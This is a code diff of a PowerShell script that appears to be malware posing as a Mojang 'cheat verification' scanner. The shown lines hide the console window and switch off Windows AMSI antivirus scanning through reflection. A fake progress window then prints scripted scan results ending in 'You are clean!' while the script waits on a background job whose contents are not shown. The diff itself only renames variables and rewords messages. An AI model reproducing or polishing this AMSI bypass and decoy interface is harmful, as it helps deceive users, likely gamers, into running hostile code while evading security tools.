@@ -1,11 +1,11 @@
-$c=@'
+$c=@"
 using System;
 using System.Runtime.InteropServices;
 public class W {
 [DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);
 [DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();
 }
-'@
+"@
 Add-Type $c
 [W]::ShowWindow([W]::GetConsoleWindow(),0)
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
@@ -44,7 +44,7 @@ $t.Size="520,25"
 $t.Location="15,15"
 $f.Controls.Add($t)
 $v=New-Object System.Windows.Forms.Label
-$v.Text="Version: 5.2.1 | Mojang AB | Session: "+($r=Get-Random -Minimum 100000 -Maximum 999999)
+$v.Text="Version: 5.2.1 | Mojang AB | Session: "+(Get-Random -Minimum 100000 -Maximum 999999)
 $v.Font="Arial,8"
 $v.ForeColor="#888888"
 $v.Size="520,20"
@@ -54,13 +54,13 @@ $pb=New-Object System.Windows.Forms.ProgressBar
 $pb.Size="505,22"
 $pb.Location="15,70"
 $f.Controls.Add($pb)
-$s=New-Object System.Windows.Forms.Label
-$s.Text="[1/7] Initializing verification modules..."
-$s.Font="Arial,10"
-$s.ForeColor="#FFD700"
-$s.Size="505,22"
-$s.Location="15,100"
-$f.Controls.Add($s)
+$st=New-Object System.Windows.Forms.Label
+$st.Text="[1/7] Initializing verification modules..."
+$st.Font="Arial,10"
+$st.ForeColor="#FFD700"
+$st.Size="505,22"
+$st.Location="15,100"
+$f.Controls.Add($st)
 $l=New-Object System.Windows.Forms.RichTextBox
 $l.Size="505,140"
 $l.Location="15,130"
@@ -70,17 +70,17 @@ $l.Font="Consolas,9"
 $l.ReadOnly=$true
 $l.BorderStyle="None"
 $f.Controls.Add($l)
-$r=New-Object System.Windows.Forms.Label
-$r.Text=""
-$r.Font="Arial,11,Bold"
-$r.ForeColor="#00FF00"
-$r.Size="505,35"
-$r.Location="15,278"
-$r.TextAlign="MiddleCenter"
-$f.Controls.Add($r)
+$rl=New-Object System.Windows.Forms.Label
+$rl.Text=""
+$rl.Font="Arial,11,Bold"
+$rl.ForeColor="#00FF00"
+$rl.Size="505,35"
+$rl.Location="15,278"
+$rl.TextAlign="MiddleCenter"
+$f.Controls.Add($rl)
 $f.Show()
 function L($m){$l.AppendText("["+(Get-Date -Format "HH:mm:ss")+"] "+$m+"`n");$l.ScrollToCaret();[System.Windows.Forms.Application]::DoEvents()}
-function P($v,$m){$pb.Value=$v;$s.Text=$m;[System.Windows.Forms.Application]::DoEvents()}
+function P($v,$m){$pb.Value=$v;$st.Text=$m;[System.Windows.Forms.Application]::DoEvents()}
 P 10 "[1/7] Initializing verification modules..."
 L "Loading cheat definition database...";Start-Sleep -Milliseconds 400
 L "Definitions loaded: 12,847 signatures";Start-Sleep -Milliseconds 300
@@ -109,7 +109,7 @@ L "Matches found: 0 out of 8,472";Start-Sleep -Milliseconds 400
 P 85 "[6/7] Behavioral analysis..."
 L "Launching AI analyzer engine...";Start-Sleep -Milliseconds 500
 L "Analyzing input patterns...";Start-Sleep -Milliseconds 500
-L "AI confidence score: 98.7%";Start-Sleep -Milliseconds 400
+L "AI confidence score: 98.7 percent";Start-Sleep -Milliseconds 400
 L "Behavioral test: PASSED";Start-Sleep -Milliseconds 300
 P 95 "[7/7] Generating final report..."
 L "Compiling scan results...";Start-Sleep -Milliseconds 500
@@ -125,6 +125,6 @@ L "  Status: VERIFIED";Start-Sleep 200
 L "========================================";Start-Sleep 300
 Wait-Job $j -Timeout 30|Out-Null
 Remove-Job $j -Force -EA 0
-$r.Text="Congratulations! You passed verification! No cheats found."
+$rl.Text="Verification passed! No cheats detected! You are clean!"
 Start-Sleep -Seconds 5
 $f.Close()
